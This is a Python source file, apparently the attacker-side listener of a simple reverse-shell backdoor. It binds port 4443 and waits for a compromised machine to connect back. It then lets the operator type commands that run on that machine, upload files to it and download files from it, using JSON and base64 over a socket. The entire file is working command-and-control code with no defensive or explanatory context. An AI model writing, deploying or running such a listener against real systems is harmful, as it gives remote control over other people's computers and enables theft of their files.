import socket
import json
import base64
from base64 import b64decode

class Listener:
	def __init__(self, ip, port):
		listener=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR , 1)
		listener.bind((ip, port))
		listener.listen(3)
		print("wating for the connection" )
		self.connection , address = listener.accept()
		print("[+] connection establish" + str(address))
	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		json_data = bytearray()
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				x = json.loads(json_data)
				return x
			except ValueError:
				continue    
	   
	def write_file(self, path, content):

		with open(path, "wb") as file:
			print(type(content))                     #str
			file.write(base64.b64decode(content))
			return "[+] download sucessfull"    

	def remotely_execute(self , command):
		self.reliable_send(command)

		if (command[0] == 'exit'):
			self.socket.close()
			exit() 
		return self.reliable_receive()

	def read_file(self, path):	
		with open(path , "rb") as file:
			contant = file.read()
			print(type(contant))
			contant = (base64.b64encode(contant))
			print(type(contant))
			return contant.decode()							
				
	def run(self):
		while True:
			command=input(">> ")
			command = command.split(" ")

			try:
				if (command[0] == 'upload'):
					file_data=self.read_file(command[1])
					command.append(file_data)	

				result = self.remotely_execute(command)

				if  (command[0] == 'download' and '[-] Error' not in result):
					result = self.write_file(command[1], result)
			except Exception:
				result = '[-] Error during command execution'

			
			print(result)
		

my_listener = Listener("" , 4443)
my_listener.run()




								 